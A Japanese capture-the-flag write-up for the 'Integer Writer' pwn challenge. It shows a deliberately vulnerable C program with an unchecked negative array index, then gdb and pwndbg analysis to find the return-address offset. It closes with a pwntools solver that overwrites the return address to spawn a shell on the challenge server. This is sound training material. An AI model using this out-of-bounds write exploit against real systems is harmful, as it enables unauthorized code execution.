# Integer Writer ( 2025/12/5 )
## Description
うっかり戻りアドレス書き換えられたらシェル起動できちゃうって冷静に考えてやばくね？気をつけなきゃ...
## Solve
配布されるコードは以下の通りです。
```c
// gcc -o chal main.c -fno-pie -no-pie
#include <stdio.h>
#include <string.h>
#include <unistd.h>


/*
** How to get the address of `win` **

  $ nm chal | grep win
  XXXXXXXXX

This address is **fixed** across executions, because the challenge binary
`chal` is compiled with -fno-pie (i.e., without position-independent code).
*/
void win() {
    execve("/bin/sh", NULL, NULL);
}

int main(void) {
    int integers[100], pos;

    /* disable stdio buffering */
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("pos > ");
    scanf("%d", &pos);
    if (pos >= 100) {
        puts("You're a hacker!");
        return 1;
    }
    printf("val > ");
    scanf("%d", &integers[pos]);

    return 0;
}
```
配布コードを見ると、win関数でshellが開かれるようになっています。
Descriptionにある通り、戻りアドレスを書き換えてシェル起動をしてしまえば、flagを読めそうです。
ここで、scanfに着目します。scanf("%d",&integers[pos]);は、ユーザーから受け取ったpos,valを基に、integersのposの位置にvalを書き込むことがわかります。
(valは%dとして受け取られており、整数としての解釈がなされています)
結論から言うと、このposに細工をして配列の範囲外書き込みを行います。まず、今回ユーザーから受け取ったposについて、
```c
if (pos >= 100) {
    puts("You're a hacker!");
    return 1;
}
```
というエスケープが行われています。しかし、このエスケープではposに負数が与えられた場合の処理が行えていません。今回はそこを突きます。
※ここでは、スタック等に関する詳しい解説は行いませんが、moraさんのwriteupで解説されているので、ご参照ください。(https://moraprogramming.hateblo.jp/entry/2025/12/06/041519)

早速、BOFに必要なアドレスを調べに行きます。まず、main.cにもコメントアウトで書かれているように、win関数のアドレスを調べます。
```
└─$ checksec chal                            
[*] '/home/kali/Desktop/DailyAlpacaHack/integer-writer/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
上記のchecksecの結果より、今回PIEは無効化されているので、検証環境と同じアドレスで攻撃が行えそうです。
```
└─$ nm chal | grep win
00000000004011d6 T win
```
これより、win関数のアドレスは0x4011d6であることがわかります。ここで注意したいのが、このアドレス(0x4011d6)はhexであり、今回のプログラムにおいては入力がint型で受け取られるということです。
そのため、hexはint型に変換しておいた方がよさそうです。
``` python
└─$ python3 -c "print(0x4011d6)"
4198870
```
次に、integers配列のアドレスを調べに行きます。今回はgdbを用いて調べていきます。(私はpwngdbを使用しています)
とりあえず、mainの逆アセンブルをしてみましょう。
```
pwndbg> b main
Breakpoint 1 at 0x401204
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004011f5 <+0>:     endbr64
   0x00000000004011f9 <+4>:     push   rbp
   0x00000000004011fa <+5>:     mov    rbp,rsp
   0x00000000004011fd <+8>:     sub    rsp,0x1b0
   0x0000000000401204 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x000000000040120d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401211 <+28>:    xor    eax,eax
   0x0000000000401213 <+30>:    mov    rax,QWORD PTR [rip+0x2e36]        # 0x404050 <stdin@GLIBC_2.2.5>
   0x000000000040121a <+37>:    mov    esi,0x0
   0x000000000040121f <+42>:    mov    rdi,rax
   0x0000000000401222 <+45>:    call   0x4010b0 <setbuf@plt>
   0x0000000000401227 <+50>:    mov    rax,QWORD PTR [rip+0x2e12]        # 0x404040 <stdout@GLIBC_2.2.5>
   0x000000000040122e <+57>:    mov    esi,0x0
   0x0000000000401233 <+62>:    mov    rdi,rax
   0x0000000000401236 <+65>:    call   0x4010b0 <setbuf@plt>
   0x000000000040123b <+70>:    mov    rax,QWORD PTR [rip+0x2e1e]        # 0x404060 <stderr@GLIBC_2.2.5>
   0x0000000000401242 <+77>:    mov    esi,0x0
   0x0000000000401247 <+82>:    mov    rdi,rax
   0x000000000040124a <+85>:    call   0x4010b0 <setbuf@plt>
   0x000000000040124f <+90>:    mov    edi,0x40200c
   0x0000000000401254 <+95>:    mov    eax,0x0
   0x0000000000401259 <+100>:   call   0x4010c0 <printf@plt>
   0x000000000040125e <+105>:   lea    rax,[rbp-0x1a4]
   0x0000000000401265 <+112>:   mov    rsi,rax
   0x0000000000401268 <+115>:   mov    edi,0x402013
   0x000000000040126d <+120>:   mov    eax,0x0
   0x0000000000401272 <+125>:   call   0x4010e0 <__isoc99_scanf@plt>
   0x0000000000401277 <+130>:   mov    eax,DWORD PTR [rbp-0x1a4]
   0x000000000040127d <+136>:   cmp    eax,0x63
   0x0000000000401280 <+139>:   jle    0x401293 <main+158>
   0x0000000000401282 <+141>:   mov    edi,0x402016
   0x0000000000401287 <+146>:   call   0x401090 <puts@plt>
   0x000000000040128c <+151>:   mov    eax,0x1
   0x0000000000401291 <+156>:   jmp    0x4012cf <main+218>
   0x0000000000401293 <+158>:   mov    edi,0x402027
   0x0000000000401298 <+163>:   mov    eax,0x0
   0x000000000040129d <+168>:   call   0x4010c0 <printf@plt>
   0x00000000004012a2 <+173>:   mov    eax,DWORD PTR [rbp-0x1a4]
   0x00000000004012a8 <+179>:   lea    rdx,[rbp-0x1a0]
   0x00000000004012af <+186>:   cdqe
   0x00000000004012b1 <+188>:   shl    rax,0x2
   0x00000000004012b5 <+192>:   add    rax,rdx
   0x00000000004012b8 <+195>:   mov    rsi,rax
   0x00000000004012bb <+198>:   mov    edi,0x402013
   0x00000000004012c0 <+203>:   mov    eax,0x0
   0x00000000004012c5 <+208>:   call   0x4010e0 <__isoc99_scanf@plt>
   0x00000000004012ca <+213>:   mov    eax,0x0
   0x00000000004012cf <+218>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004012d3 <+222>:   sub    rdx,QWORD PTR fs:0x28
   0x00000000004012dc <+231>:   je     0x4012e3 <main+238>
   0x00000000004012de <+233>:   call   0x4010a0 <__stack_chk_fail@plt>
   0x00000000004012e3 <+238>:   leave
   0x00000000004012e4 <+239>:   ret
End of assembler dump.
```
この結果から、scanf(の処理の大きなまとまりは)
```
   0x00000000004012a2 <+173>:   mov    eax,DWORD PTR [rbp-0x1a4]
   0x00000000004012a8 <+179>:   lea    rdx,[rbp-0x1a0]
   0x00000000004012af <+186>:   cdqe
   0x00000000004012b1 <+188>:   shl    rax,0x2
   0x00000000004012b5 <+192>:   add    rax,rdx
   0x00000000004012b8 <+195>:   mov    rsi,rax
   0x00000000004012bb <+198>:   mov    edi,0x402013
   0x00000000004012c0 <+203>:   mov    eax,0x0
   0x00000000004012c5 <+208>:   call   0x4010e0 <__isoc99_scanf@plt>
```
の部分であることがわかります。ここで注目すべきは、
```
   0x00000000004012a8 <+179>:   lea    rdx,[rbp-0x1a0]
```
です。ここでは、integers[0]のアドレスをrdxに代入しています。すなわち、integers[0]のアドレスは、$rbp-0x1a0であることがわかります。
このことから、integers[0]のアドレスは以下のように調べることができます。
```
pwndbg> r
Starting program: /home/kali/Desktop/DailyAlpacaHack/integer-writer/chal 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000000000401204 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────[ LAST SIGNAL ]───────────────────────────────────────────────────
Breakpoint hit at 0x401204
───────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────
 RAX  0x7ffff7f9de28 (environ) —▸ 0x7fffffffdde8 —▸ 0x7fffffffe17c ◂— 'COLORFGBG=15;0'
 RBX  0
 RCX  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
 RDX  0x7fffffffdde8 —▸ 0x7fffffffe17c ◂— 'COLORFGBG=15;0'
 RDI  1
 RSI  0x7fffffffddd8 —▸ 0x7fffffffe145 ◂— '/home/kali/Desktop/DailyAlpacaHack/integer-writer/chal'
 R8   0x7ffff7f96680 (__exit_funcs) —▸ 0x7ffff7f97fe0 (initial) ◂— 0
 R9   0x7ffff7f97fe0 (initial) ◂— 0
 R10  0x7fffffffda10 ◂— 0x800000
 R11  0x206
 R12  1
 R13  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2f0 ◂— 0
 R14  0x7fffffffdde8 —▸ 0x7fffffffe17c ◂— 'COLORFGBG=15;0'
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
 RBP  0x7fffffffdcc0 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe145 ◂— '/home/kali/Desktop/DailyAlpacaHack/integer-writer/chal'
 RSP  0x7fffffffdb10 ◂— 0
 RIP  0x401204 (main+15) ◂— mov rax, qword ptr fs:[0x28]
────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
b► 0x401204 <main+15>    mov    rax, qword ptr fs:[0x28]          RAX, [0x7ffff7dac768] => 0x98a84edef5cde600
   0x40120d <main+24>    mov    qword ptr [rbp - 8], rax          [0x7fffffffdcb8] <= 0x98a84edef5cde600
   0x401211 <main+28>    xor    eax, eax                          EAX => 0
   0x401213 <main+30>    mov    rax, qword ptr [rip + 0x2e36]     RAX, [stdin@GLIBC_2.2.5] => 0x7ffff7f968e0 (_IO_2_1_stdin_) ◂— 0xfbad2088                                                                                             
   0x40121a <main+37>    mov    esi, 0                            ESI => 0
   0x40121f <main+42>    mov    rdi, rax                          RDI => 0x7ffff7f968e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
   0x401222 <main+45>    call   setbuf@plt                  <setbuf@plt>
 
   0x401227 <main+50>    mov    rax, qword ptr [rip + 0x2e12]     RAX, [stdout@GLIBC_2.2.5]
   0x40122e <main+57>    mov    esi, 0                            ESI => 0
   0x401233 <main+62>    mov    rdi, rax
   0x401236 <main+65>    call   setbuf@plt                  <setbuf@plt>
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdb10 ◂— 0
... ↓        2 skipped
03:0018│-198 0x7fffffffdb28 —▸ 0x400040 ◂— 0x400000006
04:0020│-190 0x7fffffffdb30 ◂— 0x38 /* '8' */
05:0028│-188 0x7fffffffdb38 ◂— 0xd /* '\r' */
06:0030│-180 0x7fffffffdb40 ◂— 0x1000
07:0038│-178 0x7fffffffdb48 —▸ 0x7ffff7fc7000 ◂— 0x3010102464c457f
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► 0         0x401204 main+15
   1   0x7ffff7dd8f75 __libc_start_call_main+117
   2   0x7ffff7dd9027 __libc_start_main+135
   3         0x401115 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p/x $rbp
$1 = 0x7fffffffdcc0
pwndbg> p/x $rbp-0x1a0
$2 = 0x7fffffffdb20
pwndbg> 
```
rで実行、p/xでrbpレジスタの値の取得、その後-0x1a0を追加してintegers[0]のアドレスを求め、0x7fffffffdb20であることがわかりました。
次に、scanf実行の際のreturnアドレスがどこにあるかを調べに行きます。scanfのreturnアドレスを求めたいので、scanfが実行される直前にbreakpointを置きます。
(先ほどのmainの逆アセンブル結果から、scanfのアドレスが0x4012c5であることがわかっているので、b *0x4012c5としてbreakpointを置きます。)
早速runして、siでcallの中に入り、x/20wx $rspでアドレスを探します。
```
pwndbg> x/20wx $rsp
0x7fffffffdb08: 0x004012ca      0x00000000      0x00000000      0x00000000
0x7fffffffdb18: 0x00000000      0x0000002a      0x00000000      0x00000000
0x7fffffffdb28: 0x00400040      0x00000000      0x00000038      0x00000000
0x7fffffffdb38: 0x0000000d      0x00000000      0x00001000      0x00000000
0x7fffffffdb48: 0xf7fc7000      0x00007fff      0x00000000      0x00000000
pwndbg> 
```
0x7fffffffdb08に、0x004012caという戻りアドレスが入っています。これは、先ほどのmain逆アセンブル結果からも見てわかるように、scanfの後に0x4012caが呼び出されていることから正しいアドレスであることを確認できます。つまり、integers[0]から、
```
└─$ python3 -c "print(0x7fffffffdb08-0x7fffffffdb20)"
-24
```
より24byte下がれば戻りアドレスにたどり着く、というわけです。ここで、integersはint配列なので、インデックス1つあたりに4byteが含まれます。よって、
-24 / 4 = -6
より、posには-6を入れればよいわけです。(valに入れる値は、先ほど求めたwinのアドレスです。)
## Solver
``` python
from pwn import *

host = "34.170.146.252"
port = 48338

context.log_level = 'debug'

p = remote(host,port)
p.recvuntil(b"pos")
p.sendline(b'-6')
p.recvuntil(b"val")
p.sendline(b"4198870")
p.recvline
p.interactive()
```